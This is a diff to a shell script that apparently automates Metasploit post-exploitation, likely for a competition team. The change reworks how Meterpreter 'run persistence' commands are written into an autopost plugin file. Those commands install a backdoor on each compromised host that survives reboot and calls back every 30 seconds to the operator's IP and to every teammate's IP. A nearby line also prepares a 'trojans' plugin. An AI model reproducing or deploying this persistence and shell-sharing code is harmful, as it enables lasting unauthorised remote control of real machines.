@@ -117,11 +117,8 @@ rm /tmp/autopost.rb.* 2> /dev/null
 
 #  Lets setup the plugins!
 echo "session.run_cmd('run persistence -S -U -X -i 30 -p $TS_TEAM_PORT -r $TS_MY_IP')" > .msf/plugins/.autopost.source.persistence
-if [ $TS_SHARE_SHELLS == 1 ]; then
-	TEAM_MATES=`echo $TS_TEAM_MATES | sed -e 's/;/\n/g'`
-        if [[ $TEAM_MATES -ne "" ]]; then
-		echo $TEAM_MATES | sed -e 's/^/session.run_cmd(\"run persistence -S -U -X -i 30 -p '$TS_TEAM_PORT' -r /g' -e 's/$/\")/g' | tr '"' "'" >> .msf/plugins/.autopost.source.persistence
-	fi
+if [[ $TS_SHARE_SHELLS == 1 ]] || [[ $TS_SHARE_SHELLS != "" ]]; then
+	echo $TS_TEAM_MATES | sed -e 's/;/\n/g' | sed -e 's/^/session.run_cmd(\"run persistence -S -U -X -i 30 -p '$TS_TEAM_PORT' -r /g' -e 's/$/\")/g' | tr '"' "'" >> .msf/plugins/.autopost.source.persistence
 fi
 
 echo > .msf/plugins/.autopost.source.trojans
